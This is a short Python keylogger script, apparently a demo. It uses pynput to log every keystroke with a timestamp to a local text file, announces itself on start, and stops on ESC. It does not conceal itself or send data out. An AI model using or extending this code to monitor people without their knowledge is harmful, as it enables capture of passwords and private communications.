from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{time} - {key}\n")

def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        write_to_file(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False  # stop listener

print("Keylogger started (Press ESC to stop)")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
